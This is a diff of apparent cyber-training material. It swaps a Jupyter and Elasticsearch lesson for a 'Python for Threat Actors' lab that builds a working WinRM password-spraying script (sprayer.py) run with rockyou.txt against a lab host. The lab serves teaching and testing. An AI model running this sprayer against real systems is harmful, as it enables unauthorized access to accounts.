@@ -1,767 +1,458 @@
 
-Set Up a Jupyter Notebook Using Python
-Jupyter Notebook is a browser-based, open-source application that supports program development in a large number of programming languages. The development environment is known as a “notebook.” A Jupyter notebook provides an interactive programming session similar to a Command-Line Interface (CLI). Each notebook of code can be saved, then imported into and exported out of other existing notebooks or Python scripts. Jupyter's seamless integration allows for ease of use, code reusability, and code sharing.
+Python for Threat Actors
+Python has many advantages that make it a popular choice for scripting, such as the following:
+
+Efficient: Premade scripts make constructing new solutions fast and easy.
+Versatile: Many premade libraries readily integrate with Python.
+Ubiquitous: Various tools and tradecraft are available in Python.
+However, these are also the same reasons adversaries choose Python for their toolkits. Namely, there are many libraries available for implementing protocols and communications for adversarial activities. These include the following:
+
+Scapy
+ImpacketSMB
+Paramiko
+Scapy
+﻿
+
+Threat actors use the Scapy Python library to create custom packets for network traffic. Creating custom packets is useful for implementing custom communication protocols, triggering certain types of network attacks, and exploiting vulnerable services.
 
 ﻿
 
-Jupyter Notebook is useful for collaboration within a coding project as multiple users can use the same notebook to share code. However, Jupyter does not generate code nor does it translate code from one programming language to another. Jupyter cannot help with converting Java or C++ code into Python. This lesson focuses on using only the Python coding language within Jupyter Notebook.
+ImpacketSMB
+﻿
+
+ImpacketSMB is a pure Python implementation of Server Message Block (SMB) that allows a threat actor to write a number of different tools that use the SMB protocol. These tools may implement known Windows SMB exploits or target SMB services, such as shared network resources, to execute adversarial tactics such as lateral movement or privilege escalation. ImpacketSMB has been used to create tools such as Impacket-Psexec, which allows attackers to run commands through the SMB share ADMIN$ when a user has the appropriate privileges. With access to the C$ share, this library may also be used to script file listing or file retrieval tools.
 
 ﻿
 
-The following lab walks through the process of creating a new Jupyter Notebook for the controlled execution of Python code. The lab highlights how portions of Python code can be separated into individual sections. This is similar to code breakpoints that allow debugging and analysis before executing an entire program.
+Paramiko
+﻿
+
+Paramiko is a pure Python Secure Shell (SSH) library which threat actors use to access the SSH service on a target. Threat actors leverage this tool either for password spraying, credentialed access, or attack execution against vulnerable SSH versions.
+
+﻿
+Brute Force Authentication over WinRM
+An example of how threat actors weaponize Python as an attack tool is by leveraging two components: PyWinRM library and password spraying. These components are also effective for auditing and testing a mission partner environment. Threat actors use these components to create a basic script that authenticates to a host over the Windows Remote Management (WinRM) protocol when provided a username and password as input.
 
 ﻿
 
-Set Up a Jupyter Notebook
+PyWinRM
 ﻿
 
-Create a new Jupyter Notebook. Then, test the notebook by entering Python code, executing commands, and examining the output of running sections of code.
+The PyWinRM library contains code to build a Python client for the WinRM service. A threat adversary may use this library to script commands that invoke a target Windows machine from any attack platform that runs Python code. When enabled on victim devices, the WinRM service allows an authenticated user to perform various management tasks remotely. These include, but are not limited to running batch scripts, running PowerShell scripts, and fetching Windows Management Instrumentation (WMI) variables.
+
+﻿
+
+Password Spraying
+﻿
+
+As multiple points of presence in an increasingly connected world have become common, the rate of password reuse and password exposure has grown significantly. These parallel, but interconnected, problems contribute to a large and vulnerable attack surface in many organizations. Attackers are aware of the high likelihood of users in a mission partner environment reusing passwords. The attackers, in turn, respond with brute force attacks that leverage lists of passwords exposed by data dumps such as the 2021 Microsoft Exchange breach or the 2019 Facebook leak. These brute force attacks lead to a large reward for very little effort. This is why password spraying is one of the most common techniques that defenders see on external endpoints.
+
+﻿
+
+MITRE provides the following explanation for how adversaries commonly use password spraying in a brute force attack:
+
+﻿
+
+"Adversaries may use a single or small list of commonly used passwords against many different accounts to attempt to acquire valid account credentials. Password spraying uses one password (e.g. 'Password01'), or a small list of commonly used passwords, that may match the complexity policy of the domain. Logins are attempted with that password against many different accounts on a network to avoid account lockouts that would normally occur when brute forcing a single account with many passwords."
+
+﻿
+
+Authenticate Using WinRM
+﻿
+
+Create a function that returns True if it connects to a system or False if it does not, given a username and password. First, write code that receives a username and password from a user, then employ PyWinRM library functions to attempt to authenticate to a remote WinRM server with them using a try statement. 
 
 ﻿
 
 Workflow
 ﻿
 
-1. Log in to the VM lin-hunt-cent with the following credentials:
+1. Log in to the Virtual Machine (VM) kali-hunt with the following credentials
 
 Username: trainee
 Password: CyberTraining1!
 ﻿
 
-2. Open Jupyter Notebook by selecting the Jupyter icon in the dock, as highlighted below in Figure 13.4-1:
+2. In a new terminal, change directories to the lab directory by entering the following:
+
+cd labs
+﻿
+
+3. Use either Mousepad, Nano, or Vim to open a new file and name it check_pwd.py. 
 
 ﻿
 
-﻿
+Use this file to write the initial code for accessing a system with the WinRM protocol. 
 
-Figure 13.4-1
 
-﻿
-
-Another option is to enter Jupyter into the system search bar. In either case, the application opens in a new browser window. 
+NOTE: Python is sensitive to whitespace. The source script in this lab uses tabs to indent code. To prevent syntax errors, verify the correct use of tabs in any code that is copy pasted into the VM.
 
 ﻿
 
-3. Open a new notebook by selecting New under the tab Files, then Python 3 in the menu, as displayed in Figure 13.4-2, below:
+4. Declare Python as the interpreter for the rest of the code in the file by entering the following code:
+
+#!/usr/bin/python3
+﻿
+
+This line is known as the “shebang”. It is a decoration at the beginning of the file that tells the operating system which binary file to use as an interpreter.
 
 ﻿
 
+5. Inform the Python interpreter to load the shared library PyWinRM by entering the following on the next line:
+
+import winrm
 ﻿
 
-Figure 13.4-2
-
-﻿
-
-This opens a new browser tab with a blank Jupyter Notebook. 
-
-﻿
-
-4. Define and print the function make_sandwich by entering the following code into the first cell:
-
-def make_sandwich(meat,cheese,veg1,veg2):
-	order = [meat,cheese,veg1,veg2]
-	print(order)
-make_sandwich("ham","cheddar","lettuce","tomato")
-﻿
-
-5. Select Run from the toolbar at the top of the page and observe the results.
+WinRM is not normally bundled with the default installation of the Python environment, however, it is already installed on this system.
 
 ﻿
 
-The function make_sandwich accepts several string arguments, adds these arguments to a list, and prints the contents of the list. The following is the output after running the function:
+6. Declare and initialize the test variables to confirm that the upcoming code works by entering the following:
 
-['ham', 'cheddar', 'lettuce', 'tomato']
+testip = '172.16.4.2'
+testusername = 'trainee'
+testpassword = 'CyberTaining1!'
+testdomain = 'energy'
 ﻿
 
-6. Enter the following code into the next empty cell:
+7. Declare a new function to use when opening a connection to a target machine over the WinRM protocol and test whether the given username and password combination is functioning correctly:
 
-make_sandwich("turkey","swiss","pickle","onion")
+def check_pwd(targetip,targetusername,targetpassword,targetdomain):
 ﻿
 
-7. Run the new code to view its output.
+8. Insert the provided variables into the winrm.Protocol data structure by entering the following:
 
+    Connection = winrm.Protocol(
+        endpoint='http://{}:5985/wsman'.format(targetip),
+        transport='ntlm',
+        message_encryption='always',
+        username=r'{}\{}'.format(targetdomain,targetusername),
+        password='{}'.format(targetpassword))
 ﻿
 
-The output is as follows:
-
-["turkey","swiss","pickle","onion"]
-﻿
-
-8. Save this notebook with the new name Lab1.
-
-﻿
-
-9. Close the current tab for Lab1 to return to the original Jupyter tab and ensure the newly created notebook Lab1 is listed in the files directory.
-
-﻿
-
-10. Select Quit at the top right to exit the Jupyter interface, as highlighted in Figure 13.4-3, below:
+This is used to authenticate to a WinRM server with the provided configuration. 
 
 ﻿
 
+9. Attempt to open a connection to the remote machine by running a simple command and thereafter closing the connection with the following snippet:
+
+    try:
+        shell_id = Connection.open_shell()
+        command_id = Connection.run_command(shell_id, 'ipconfig', ['/all'], console_mode_stdin=True, skip_cmd_shell=False)
+        std_out, std_err, status_code = Connection.get_command_output(shell_id, command_id)
+        Connection.cleanup_command(shell_id, command_id)
+        Connection.close_shell(shell_id)
 ﻿
 
-Figure 13.4-3
-
-﻿
-
-11. Shut down the server.
-
-﻿
-
-Use the skills from this lab to answer the next question.
-
-Click "Finish" to exit the event.
-Auto-Advance on Correct
-
-Use Python Modules in Jupyter
-Programming code in blocks allows for easier reuse and implementation in Python. Script files protect these code blocks from the volatility of the Python interpreter CLI. Script files can also be modified to contain function and variable definitions for other Python scripts to use. These types of script files are referred to as "modules". 
+This snippet is wrapped in a try statement. This enables Python to elegantly handle code that may fail with built-in try except statements, making error-handling efficient and easy. 
 
 ﻿
 
-In general, a module is not meant to execute as a stand-alone script. Instead, the standard practice is to use modules in other scripts through an import process. A module can be imported into other modules or scripts for execution without needing to redefine pre-existing functions. 
+A successful authentication returns True to indicate a valid password. Communicating an invalid password to the WinRM server returns InvalidCredentialsError. An except statement handles this error by returning False to indicate an invalid password.
 
 ﻿
 
-Modify a Python Module
+10. Handle the exception of authentication failures by entering the following code:
+
+    except winrm.exceptions.InvalidCredentialsError:
+        return False
 ﻿
 
-Modify a Python script in Jupyter Notebook to use as a Python module. Use Jupyter to move the module to a different file path for easier access in the next lab. 
+An exception is normally used to handle uncommon situations. However, in this case, the expectation is that this exception will be reached frequently. The purpose of this password spraying script is to perform many failed attempts before the correct password is identified, which returns many instances of a False response.
+
+﻿
+
+11. Return True to indicate a good password by entering the following line:
+
+    return False if std_err else True
+﻿
+
+If the authentication does not produce an exception, this line returns True. If the protocol includes some other error text, the authentication provides a final failure check by returning False.
+
+﻿
+
+12. Print output that verifies whether the authentication succeeds or fails by entering the following final lines:
+
+passwordvalidity = check_pwd(testip,testusername,testpassword,testdomain)
+print("Password {} is {} for user {}".format(testpassword,'valid' if passwordvalidity else 'invalid',testusername))
+﻿
+
+13. Save the file as check_pwd.py and exit the text editor.
+
+﻿
+
+14. Make the script executable by entering the following command:
+
+chmod +x check_pwd.py
+﻿
+
+15. Test the function in this script using the following command:
+
+./check_pwd.py
+﻿
+
+Additional Resource
+MITRE ATT&CK Password Spraying: https://attack.mitr e.org/techniques/T1110/003/ ﻿
+
+﻿Create an Attack Script
+The previous lab provided an opportunity to create a prototype for WinRM authentication. After writing the function for testing password authentication to the WinRM service, an attacker can automate the process of spraying many passwords at the service. The password spray executes the function many times in succession using passwords from a list. This list may be compiled from generic password dumps or by scraping data of interest - such as hobbies, birthdays, family names, and more from social media sites. The latter is a common open source intelligence practice performed by threat actors prior to an attack.
+
+﻿
+
+Create an Attack Script
+﻿
+
+Create an attack to replicate WinRM authentication with many passwords. Generate an intelligence report that provides the password for the user. In this lab, the mission partner’s users are known to have used passwords located in the password list rockyou.txt, located in the directory /usr/share/wordlists.
 
 ﻿
 
 Workflow
 ﻿
 
-1. Log in to the VM lin-hunt-cent with the credentials below:
+1. Log in to the VM kali-hunt with the following credentials:
 
 Username: trainee
 Password: CyberTraining1!
 ﻿
 
-2. Open Jupyter Notebook.
+2. Create the attack script by opening a new file in any text editor and naming it sprayer.py﻿
 
 ﻿
 
-3. Select the file Lab1.ipynb to open Lab1 in a new tab.
+Available text editors include Nano, Vim, and Gedit.
 
 ﻿
 
-4. Remove the function call make_sandwich from the first cell by removing the following last line of the cell:
+This file will be used to create an attack script that employs the function check_pwd, which was written in the previous lab. This script uses the libraries PyWinRM and Argparse.
 
-make_sandwich("ham","cheddar","lettuce","tomato")
 ﻿
 
-5. Select the second cell containing the following code:
+NOTE: Python is sensitive to whitespace. The source script in this lab uses tabs to indent code. To prevent syntax errors, verify the correct use of tabs in any code that is copy pasted into the VM.
 
-make_sandwich("turkey","swiss","pickle","onion")
 ﻿
 
-6. Cut the second cell by selecting the scissors from the toolbar, as highlighted in Figure 13.4-4, below:
+3. Start the attack script by including the headers and library calls, as follows:
 
+#!/usr/bin/python3
+import winrm
+import argparse
 ﻿
 
-﻿
-
-Figure 13.4-4
-
-﻿
-
-Removing the function calls from the file Lab1.py leaves only the definition for the function make_sandwich. The rest of this lab refers to this edited version of the file Lab1.py as a module.
-
-﻿
-
-7. Save the notebook as a Python script by selecting File, Download as, then Python (.py) from the menu toolbar.
-
-﻿
-
-8. Save the file by selecting Save File > OK in the resulting pop-up window.
-
-﻿
-
-Step 8 saves the file in the folder Downloads. For ease of use, follow the next set of steps to use Jupyter Notebook to move the file to the home folder of the trainee account. 
-
-﻿
-
-9. In Jupyter Notebook, select the tab Home, then select the directory Downloads from the tab Files, as highlighted in Figure 13.4-5, below:
-
-﻿
-
-﻿
-
-Figure 13.4-5
-
-﻿
-
-10. After opening Downloads, select the box next to Lab1.py, then select Move from the toolbar under the tab Files.
-
-﻿
-
-Selecting Move displays the pop-up window Move an Item. The window requests a destination to move the selected file to. Jupyter defaults to the /home/trainee file path and then provides a text box to enter a more specific path within this directory.
-
-﻿
-
-11. Move the file to the trainee home directory by deleting any text in the file path text box, then selecting Move.
-
-﻿
-
-12. Return to the Jupyter Notebook home page by selecting either the blue folder under the tab Files or the browser's back arrow.
-
-﻿
-
-Import a Python Module
-﻿
-
-Use Jupyter Notebook to import a Python module into a new Python script or notebook. Continue working in Jupyter Notebook, in the VM lin-hunt-cent.
-
-﻿
-
-Workflow
-﻿
-
-1. From the Jupyter Notebook home page, open a new browser tab with a blank notebook by using the options under the tab Files.
-
-﻿
-
-2. Import the function make_sandwich by entering the following code in the first cell:
-
-from Lab1 import make_sandwich
-﻿
-
-This line of code imports the function make_sandwich into the current Python script (or notebook, in this case) from the existing Python module Lab1. 
-
-﻿
-
-3. Execute the code to check for any errors associated with importing by selecting the line of code, then selecting Run from the toolbar at the top. 
-
-﻿
-
-There are no errors in this line of code. Jupyter indicates this by creating an empty new cell without any other output. The import line does not have any errors because the file Lab1.py exists in the same directory as the current notebook.
-
-﻿
-
-4. Enter the following line of code into the empty cell:
-
-make_sandwich("roast beef","provolone","mushroom","bell pepper")
-﻿
-
-5. Execute the code by selecting Run and observe the imported function make_sandwich successfully execute the arguments provided in the current notebook, as displayed in Figure 13.4-6, below:
-
-﻿
-
-﻿
-
-Figure 13.4-6
-
-﻿
-
-6. Quit the Jupyter Notebook server.
-
-Click "Finish" to exit the event.
-Auto-Advance
-
-
-
-Python Library Modules
-Python provides a number of pre-built modules for common tasks to aid in program efficiency. These modules are part of the Python standard library. Locating modules and their source code provides more information on the functionality of the different modules available. This information helps identify and select specific functions to import. This section reviews the following topics to enable analysts to leverage Python modules:
-
-Python standard library
-Identifying module functions
-Locating a Python module
-Python Standard Library
-﻿
-
-Although creating and importing custom modules are powerful for code reuse, it is not efficient to create a large number of modules to complete simple tasks such as the following:
-
-Calculating math 
-Enumerating filesystem paths
-Determining the current date and time
-The better option is to use the Python standard library. The library uses Python installers to provide built-in modules that provide standardized functions. For example, one common function from the standard library is math. When imported into a Python script, this function provides several methods of performing arithmetic such as trigonometric functions.
-
-﻿
-
-Another function from the standard library is print. This function prints objects to either a file or standard output (terminal). Unlike math, it is unnecessary to use an import statement to call print since it is a built-in function. Built-in functions are members of the standard library provided to all Python programs by default.
-
-﻿
-
-In addition to modules, the standard library also provides data types such as int, float, str, and list. This provides a great deal of core functionality for Python scripts and handles the logic necessary to ensure that these data types work as expected.
-
-﻿
-
-Identifying Module Functions
-﻿
-
-The previous lab used the following line of code to import a function:
-
-from Lab1 import make_sandwich
-﻿
-
-This explicitly imports only the function make_sandwich from the module Lab1. Alternatively, the entire module can be imported so that the import includes all additional modules and their functions. This task uses the following syntax, replacing Lab1 with the specific module name:
-
-import Lab1
-﻿
-
-Importing a module and all its functions requires Python to place each imported function into memory during execution. This may cause a Python script to use more resources than necessary. This is why the best practice is to import only those functions that are necessary to properly execute a specific Python script.
-
-﻿
-
- Using dir()
-﻿
-
-The function dir() is a handy tool that returns a list of object attributes. It is a member of the standard library, so it does not need to be imported. Using dir() with a module returns the names of the module attributes and functions. Figure 13.4-7, below, displays how the function make_sandwich is listed at the end of all the attributes for the module Lab1.
-
-﻿
-
-﻿
-
-Figure 13.4-7
-
-﻿
-
-The output for dir() depends on the nature of the module being analyzed. The module Lab1 contains only a single function, so its output is sparse. The standard library module math contains a number of functions associated with mathematics, so it outputs significantly more attributes, as displayed in Figure 13.4-8, below:
-
-﻿
-
-﻿
-
-Figure 13.4-8
-
-﻿
-
-Outputting all available attributes is helpful when trying to recall the names of specific functions to import, so that the entire module does not need to be imported. As an example, a script may require computing the square root of a number. Performing the command dir(math) provides the function sqrt as an option. After identifying this function name, the following code can be used to import only the necessary function:
-
-from math import sqrt
-﻿
-
-This minimizes the footprint of the script. 
-
-﻿
-
-Locating a Python Module
-﻿
-
-Locating Python modules and their source codes is helpful for editing a module's functionality and debugging. An example of a debugging case is if a custom Python program is designed to request the value of pi to 20 decimal places, but this always results in an error. The function pi belongs to the module math. Locating and analyzing the source code for math provides more information as to why this error always occurs. In Python, the function pi within the module math returns the value of pi to 15 decimal places (3.141592653589793) by default. Therefore, requesting a greater number of decimal places outputs an error. Reviewing the source code for different modules, such as math, helps understand their applications and limitations.
-
-﻿
-
-Using inspect
-﻿
-
-The location of a module depends on the organizational structure of a given Python project and whether a certain module is a member of the standard library. One way to locate a Python module is with the module inspect. Although inspect is a built-in module, it is not a member of the standard library. This module provides the method getfile(), which returns the path of the object being inspected. Figure 13.4-9, below, provides an example of importing inspect and printing the getfile() search for the function make_sandwich:
-
-﻿
-
-﻿
-
-Figure 13.4-9
-
-﻿
-
-The method getfile() can also be used to identify the locations of modules. In the following example in Figure 13.4-10, the module inspect is calling upon itself to identify its own directory:
-
-﻿
-
-﻿
-
-Figure 13.4-10
-
-﻿
+4. Insert the code from the previous lab that checks the password by entering the following:
 
-Use the information from this lab to answer the following questions.
-
-Query Data from Elasticsearch
-The following lab provides a real-world example of using Jupyter Notebook and Python for data analysis.
-
-﻿
-
-Query Data from Elasticsearch
-﻿
-
-Create a Jupyter Notebook that imports Python modules to query data from Elasticsearch.
-
-﻿
-
-Workflow
-﻿
-
-1. Log in to the VM lin-hunt-cent with the credentials below:
-
-Username: trainee
-Password: CyberTraining1!
-﻿
-
-2. Open a new notebook in Jupyter Notebook.
-
-﻿
-
-3. Import the functions Elasticsearch and Search from their respective modules by entering the following code in the first cell of the new notebook:
-
-from elasticsearch import Elasticsearch
-from elasticsearch_dsl import Search
-﻿
-
-These statements use the importing syntax from earlier in this lesson. Elasticsearch is a search engine that integrates with other software. Elasticseach_DSL is a high-level library that aids in performing searches with Elasticsearch.
-
-﻿
-
-4. Import the data manipulation tool pandas by entering the following command on the next line of the first cell:
-
-import pandas as pd
-﻿
-
-This syntax includes an alias. Pandas is a popular Python tool for manipulating data and is commonly imported as pd. Aliases are useful shorthand, but not necessary.
-
-﻿
-
-5. Execute this line by selecting Run from the toolbar at the top and view any errors that may occur as a result of this code. 
-
-﻿
-
-6. Establish the identity of the Elasticsearch server with which this script communicates and define how communication occurs by entering the following code into the new blank cell:
-
-es = Elasticsearch(['https://199.63.64.92:9200'],
-ca_certs=False,verify_certs=False, http_auth=('jupyter','CyberTraining1!'))
-searchContext = Search(using=es, index='*:so-*', doc_type='doc')
-﻿
-
-7. Execute this code by selecting Run and read the warning.
-
-﻿
-
-The notebook displays the warning because the connection with the Elasticsearch server is not fully secure. The next step disables this warning for the purposes of this lab.
-
-﻿
-
-8. Import a module that disables warnings from the previous block of code by entering and executing the following lines in the new blank cell:
-
-import urllib3
-urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
-﻿
-
-9. Assign an object a search query with arguments defining what to search for by entering and executing the code below in the new blank cell:
-
-s = searchContext.query('query_string', query='event.module:sysmon AND event.dataset:process_access')
-﻿
-
-10. Perform the search and check whether it is successful by entering and executing the following final block of code in the new blank cell:
-
-response = s.execute()
-if response.success():
-  df = pd.DataFrame((d.to_dict() for d in s.scan()))
-df
-﻿
+def check_pwd(targetip,targetusername,targetpassword,targetdomain):
+    Connection = winrm.Protocol(
+        endpoint='http://{}:5985/wsman'.format(targetip),
+        transport='ntlm',
+        message_encryption='always',
+        username=r'{}\{}'.format(targetdomain,targetusername),
+        password='{}'.format(targetpassword))
+    try:
+        shell_id = Connection.open_shell()
+        command_id = Connection.run_command(shell_id, 'ipconfig', ['/all'], console_mode_stdin=True, skip_cmd_shell=False)
+        std_out, std_err, status_code = Connection.get_command_output(shell_id, command_id)
+        Connection.cleanup_command(shell_id, command_id)
+        Connection.close_shell(shell_id)
+    except winrm.exceptions.InvalidCredentialsError:
+        return False
+    return False if std_err else True
+   
 
-NOTE: Avoid errors from copy-pasting code by verifying the code indentation is correct.
+5. Define command line arguments for values that the target user inputs by entering the following lines:
 
+parser = argparse.ArgumentParser()
+parser.add_argument('--ip', type=str, nargs='+', required=True)
+parser.add_argument('--domain', type=str, required=True)
+parser.add_argument('--user', type=str, required=True)
+parser.add_argument('--passwordfile', type=str, required=True)
+args = parser.parse_args()
 ﻿
 
-A successful search outputs the search results to a two-dimensional data frame. A data frame is a table containing the results of the Elasticsearch query. This output can either be manipulated directly with additional code in subsequent blocks or saved to a new file for analysis at a later date.
+These lines implement Argparse, which is used to receive input from a user at runtime to dynamically determine the tool’s behavior. In this case, defining input such as IP address, domain name, and a file containing possible passwords allows attackers to employ this tool against any target and with any wordlist. This includes wordlists developed with open source intelligence about a target organization’s users. 
 
 ﻿
 
-11. Save this notebook with the new name Lab2.
+6. Write a loop that tests passwords in the supplied passwords file against every host IP address listed by the user, by entering the following:
 
+for ip in args.ip:
+    print("Testing passwords for user {} on machine {} ...".format(args.user,ip))
+    finalpassword = 'No entry in password file'
+    with open(args.passwordfile,'r') as passwordfile:
+        for password in passwordfile:
+            password = password.strip()
+            passwordvalidity = check_pwd(ip,args.user,password,args.domain)
+            if passwordvalidity:
+                finalpassword = password
+                break
+    print("{} is a valid password for user {} on machine {}".format(finalpassword,args.user, ip))
 ﻿
 
-12. Create a copy of this notebook by selecting File > Make a Copy. 
+7. Save the file as sprayer.py and exit the text editor.
 
 ﻿
 
-This opens a new browser tab with a new notebook named Lab2-Copy1. 
+8. Make the script executable by entering the following command:
 
+chmod +x sprayer.py
 ﻿
 
-13. Save the notebook Lab2-Copy1 as Lab 3 for later use.
+9. Run this script against the target domain with the following command:
 
+./sprayer.py --user eve.tran --domain energy.lan --passwordfile /usr/share/wordlists/rockyou.txt --ip 172.16.4.2
 ﻿
 
 Use the information from this lab to answer the following question.
 
-Click "Finish" to exit the event.
-Auto-Advance on Correct
+Profiling Test Scripts with Python
+Introduction to Python Profiling
+﻿
 
-Data Parsing and Filtering with Python Modules and Functions
-The Elasticsearch query from the previous lab outputs many columns of data. This includes the column observer, as highlighted in Figure 13.4-11, below. This column provides Fully Qualified Domain Names (FQDN) as part of strings formatted as {'name': 'FQDN'}. It's possible to parse a list of system FQDNs from these query results after filtering the FQDN from the rest of the characters in the column values.
+According to official Python documentation, "cProfile and profile provide deterministic profiling of Python programs. A profile is a set of statistics that describes how often and for how long various parts of the program executed."
 
 ﻿
 
-﻿
-
-Figure 13.4-11
+Python profiling is a developer tool that gauges the efficiency of code performance by comparing runtimes. It compares different code that performs the same function to determine whether runtimes increase or decrease with changes to a tool’s algorithms. For small projects, these efficiencies can be negligible. For large jobs, such as sending a million authentication requests to a target server, improving efficiency saves an attacker hours. Similarly, from the blue team perspective, writing code that efficiently parses millions of lines of logs saves an overworked defensive team just as much time. 
 
 ﻿
 
-Parse and Filter Data
+Using profiling to test loop algorithms is a common practice for malicious tool developers, especially when the speed of the attack is a significant factor for success. This is often the case when an adversary is racing against the time it takes defenders to identify a potential threat and respond to an alert with an investigation and potential containment. 
+
 ﻿
 
-Parse and filter data from the Elasticsearch query results in the Lab2 Jupyter Notebook. 
+The next two labs prepare and profile two loop algorithms for an attack script. The first lab creates an alternative loop algorithm based on the original attack script. The second lab profiles the two algorithms to identify the more efficient loop.
+
+﻿
+
+Modify an Attack Script for Profiling
+﻿
+
+Duplicate an existing attack script, then modify the duplicated script by rearranging its nested loops. 
 
 ﻿
 
 Workflow
 ﻿
 
-1. Log in to the VM lin-hunt-cent with the credentials below:
+1. Log in to the VM kali-hunt with the following credentials:
 
 Username: trainee
 Password: CyberTraining1!
 ﻿
 
-2. Open the notebook Lab2 in Jupyter Notebook.
+2. Open a terminal.
 
 ﻿
 
-3. Perform text manipulation to extract the FQDNs from the column observer and create a new column systems by entering and executing the following code to the empty cell at the bottom of the Lab2 notebook:
-
-df['observer'] = df['observer'].astype(str)
-df['systems'] = df['observer'].str.rsplit("'",3).str[2].str.strip()
-df
-﻿
-
-The Pandas data frame method astype(str) casts the contents of the column observer as a string. Running this command creates the column systems and populates its values through string manipulation of the values in the column observer. The column observer formats its values as {'name': 'FQDN'}, which are two substrings in single quotes that are separated by a colon. This substring arrangement allows the function str.rsplit to use the single quote delimiter to split the string. 
+3. Create a copy of the attack script sprayer.py from the previous lab and name it sprayer2.py.
 
 ﻿
 
-The function str.rsplit("'",3) splits the string {'name': 'FQDN'} at each single quote before FQDN, which creates three substrings. Substrings are counted from zero, so the FQDN is included in substring number two. This is noted with .str[2]. The method str.strip() removes any leading or trailing whitespace characters.
-
-﻿
-
-Choosing different substring values changes the results. For example, the output would be different if str[2] was changed to str[0], as displayed in Figure 13.4-12, below. As str.rsplit("'",3) splits the entire string in each entry of the column observer into three substrings, str[0] selects the first substring. The first substring is always {'name.
+4. In the script sprayer2.py, scroll to the code block displayed in Figure 14.1-1, below:
 
 ﻿
 
 ﻿
 
-Figure 13.4-12
+Figure 14.1-1﻿
 
 ﻿
 
-4. Print the column systems of the Elasticsearch query results by entering and executing the following code into a new empty block in the notebook:
-
-print(df['systems'])
-﻿
-
-The results present duplicate values. 
+Continue working in the script sprayer2.py to complete steps 5-10, which modify the code block displayed in Figure 14.1-1.
 
 ﻿
 
-5. Filter by unique values by invoking the pandas function unique(), as follows:
+5. Insert the following code immediately before the line for ip in args.ip:
 
-print(df['systems'].unique())
+with open(args.passwordfile,'r') as passwordfile:
+    for password in passwordfile:
+        password = password.strip()
 ﻿
 
-Filtering reduces the number of FQDN values from 1240 to just 14 unique values. 
-
-﻿
-
-6. Sort the list of unique FQDNs by combining the function sorted() with the function unique(), as follows:
-
-print(sorted(df['systems'].unique()))
-﻿
-Parsing and Filtering with Regular Expressions
-The previous lab presented a method of parsing and filtering data that uses string manipulation with the functions rsplit() and strip(). Data can also be parsed and filtered using regular expressions, which act as a powerful shorthand for complex pattern matching. 
+6. Remove the line that follows for ip in args.ip: and begins with print("Testing passwords﻿
 
 ﻿
 
-Regular expressions can be used with the Elasticsearch query results from Lab2. In this example, the column observer contains strings that include FQDNs with extraneous characters and information. Figure 13.4-13, below displays how head() is used to limit the number of lines that are printed from the data frame:
+7. Remove the three lines that follow finalpassword = 'No entry in password file', from with open(args.passwordfile,'r') to password.strip()﻿
 
 ﻿
 
-﻿
-
-Figure 13.4-13
+8. Remove break from the line that follows finalpassword = password﻿
 
 ﻿
 
-Each entry in this column follows the pattern {'name': '[FQDN]'}. To extract specific data from each row in the column, a regular expression can be used to parse the FQDN from the substring housed within the second set of single quotes as shown in the code block in Figure 13.4-14, below:
+9. Add the following two lines immediately after the line that begins with print("{} is a valid﻿
+
+        if passwordvalidity:
+            break
+﻿
+
+10. Remove any blank lines in the modified code block so that the final block is written as follows:
+
+with open(args.passwordfile,'r') as passwordfile:
+    for password in passwordfile:
+        password = password.strip()
+        for ip in args.ip:
+            finalpassword = 'No entry in password file'
+            passwordvalidity = check_pwd(ip,args.user,password,args.domain)
+            if passwordvalidity:
+                finalpassword = password
+                print("{} is a valid password for user {} on machine {}".format(finalpassword,args.user, ip))
+        if passwordvalidity:
+            break
+﻿
+
+Ensure the modified code block matches step 10, before moving on to the next lab.
 
 ﻿
 
-﻿
-
-Figure 13.4-14
+11. Save the file as  sprayer2.py  and exit the text editor.
 
 ﻿
 
-In this code block, the module for regular expressions (re) is imported, and the data within the column observer is cast into strings. Then, the data in each row of observer is inspected using the function re.findall(). This function is useful in this case since there are multiple pattern matches for each row. The following regular expression is used with this function:
-
-r'\'(.+?)\''
+Profile Attack Algorithms
 ﻿
 
-This regular expression includes the following components:
-
-r - Treats the pattern as a raw string that allows escape characters.
-' - Opens the pattern (only the first single quote).
-\' - Indicates that a single quote is part of the pattern and not a closing single quote ending the pattern.
-(.+?) - Accepts any characters that follow the previous single quote in a non-greedy fashion. Without the question mark, the entire original string would be returned.
-\' - Closes the second single quote pattern, which results in a pattern that searches for any characters contained by single quotes.
-' - Closes the first single quote pattern and defines what the regular expression should search for.
-The function re.findall() returns a list containing all pattern matches within a string. This is useful because each string has two regular expression pattern matches. For example, the first string results in ['name', 'dmz-smtp.energy.com]. Since it is clear that the second substring contains the FQDN, only fqdn[1] is printed in the code block from Figure 13.4-14, above.
-
-﻿
-
-The following additional regular expression parsing functions are also available:
-
-re.match() - Searches for a regular expression pattern in a string and returns the first occurrence in the first line. Also ignores any additional patterns that exist in a multi-line string.
-re.search() - Finds the first pattern match for every line in a string.
-Parsing and filtering data allows analysts to reduce the size of a dataset and format it for further analysis. A common analysis task is to search data to match known strings or substrings. The systems data from the notebook Lab2 is an example of data that is ready for closer analysis since it was parsed and filtered in the last lab. This data provides strings and substrings to match against. 
-
-﻿
-
-Search Data with Regular Expressions
-Continue working in the VM lin-hunt-cent. Identify indicators of compromise by using the regular expression module to search the Elasticsearch query results for the following systems:
-
-BP-WKSTN-10.energy.lan
-eng-wkstn-3.energy.lan
-zeroday.energy.lan
-Workflow
-﻿
-1. Open the notebook Lab2 in Jupyter Notebook, if it is not already open.
-
-﻿
-
-2. Search the Elasticsearch query results by entering and executing the following code in the free block at the end of the notebook:
-
-import re
-search_list = ["BP-WKSTN-10.energy.lan","eng-wkstn-3.energy.lan","zeroday.energy.lan"]
-
-for i in df['systems'].unique():
-    for j in search_list:
-        if re.search(j,i):
-            print("Found a match for " + j)
-﻿
-
-This output identifies two systems in the search_list that are present in the Elasticsearch query results, so they are worth investigating. This search calls the function unique() before engaging the column systems to provide refined results. Performing this search without unique() affects the number of results returned and includes the duplicate values that exist in the column systems.
-
-﻿
-
-The method above is useful when there is a list of known strings to search for, such as FQDNs. However, often there is only a substring available, such as wkstn. 
-
-﻿
-
-3. Display all systems containing the substring wkstn in their FQDN by entering and executing the following:
-
-for i in df['systems'].unique():
-    wkstn_hunt = re.search("wkstn", i)
-    if wkstn_hunt:
-        print("Discovered " + i)
-﻿
-
